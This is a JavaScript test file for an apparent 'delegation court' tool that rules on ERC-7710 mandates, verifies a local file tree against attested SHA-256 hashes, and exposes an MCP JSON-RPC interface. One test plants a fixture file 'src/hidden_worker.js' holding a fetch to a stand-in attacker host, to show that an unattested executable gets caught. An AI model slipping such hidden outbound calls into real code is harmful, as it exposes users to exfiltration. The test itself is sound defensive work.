import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import {
  computeTreeSha256,
  queryDelegationCourtRuling,
  verifyLocalDirectoryTree,
} from '../../cli/delegation-court.mjs';
import { handleJsonRpcMessage } from '../../cli/mcp-server.mjs';

test('CLI verifier upholds compliant ERC-7710 mandate and blocks/revokes breached mandate', async () => {
  const clean = await queryDelegationCourtRuling(
    'OpenZeppelin/openzeppelin-contracts@3e6c86392c97fbc30d3d20a378a6f58beba08eba'
  );
  assert.equal(clean.verdict, 'UPHELD');
  assert.equal(clean.risk_level, 'LOW');
  assert.equal(clean.erc7710_active, true);
  assert.equal(clean.slash_bps, 0);

  const blocked = await queryDelegationCourtRuling(
    'agent-tools-lab/solana-rebalancer-mcp@7b4e9102aa891234bcde0987654321fedcba0987'
  );
  assert.equal(blocked.verdict, 'BLOCKED_AND_REVOKED');
  assert.equal(blocked.risk_level, 'CRITICAL');
  assert.equal(blocked.erc7710_active, false);
  assert.equal(blocked.slash_bps, 10000);
});

test('verifyLocalDirectoryTree approves complete tree and revokes ERC-7710 on unattested local executable', async () => {
  const tmpDir = await mkdtemp(path.join(os.tmpdir(), 'delegation-court-tree-'));
  try {
    const pkgBytes = Buffer.from('{"name":"demo","version":"1.0.0"}', 'utf8');
    const idxBytes = Buffer.from('export const ok = true;\n', 'utf8');
    await mkdir(path.join(tmpDir, 'src'), { recursive: true });
    await writeFile(path.join(tmpDir, 'package.json'), pkgBytes);
    await writeFile(path.join(tmpDir, 'src', 'index.ts'), idxBytes);

    const treeEntries = [
      {
        path: 'package.json',
        sha256: createHash('sha256').update(pkgBytes).digest('hex'),
        byte_length: pkgBytes.byteLength,
        classification: 'manifest',
        audited: true,
      },
      {
        path: 'src/index.ts',
        sha256: createHash('sha256').update(idxBytes).digest('hex'),
        byte_length: idxBytes.byteLength,
        classification: 'executable',
        audited: true,
      },
    ];
    const tc = {
      tree_sha256: computeTreeSha256(treeEntries),
      total_files: 2,
      declared_dependencies: [],
      tree_entries: treeEntries,
    };

    const okCheck = await verifyLocalDirectoryTree(tmpDir, tc);
    assert.equal(okCheck.verified, true);
    assert.equal(okCheck.omittedOrMismatchedPaths.length, 0);

    // Add an omitted executable file (`src/hidden_worker.js`) not in tree_entries
    await writeFile(path.join(tmpDir, 'src', 'hidden_worker.js'), 'fetch("https://evil.tld")');
    const failCheck = await verifyLocalDirectoryTree(tmpDir, tc);
    assert.equal(failCheck.verified, false);
    assert.ok(failCheck.omittedOrMismatchedPaths.includes('src/hidden_worker.js'));
  } finally {
    await rm(tmpDir, { recursive: true, force: true });
  }
});

test('MCP JSON-RPC server lists tools and executes delegation_court_check_ruling', async () => {
  const listRes = await handleJsonRpcMessage({
    jsonrpc: '2.0',
    id: 1,
    method: 'tools/list',
  });
  assert.equal(listRes.result.tools[0].name, 'delegation_court_check_ruling');

  const callRes = await handleJsonRpcMessage({
    jsonrpc: '2.0',
    id: 2,
    method: 'tools/call',
    params: {
      name: 'delegation_court_check_ruling',
      arguments: {
        target:
          'OpenZeppelin/openzeppelin-contracts@3e6c86392c97fbc30d3d20a378a6f58beba08eba',
      },
    },
  });
  assert.equal(callRes.result.isError, false);
  const payload = JSON.parse(callRes.result.content[0].text);
  assert.equal(payload.verdict, 'UPHELD');
  assert.equal(payload.erc7710_active, true);
});
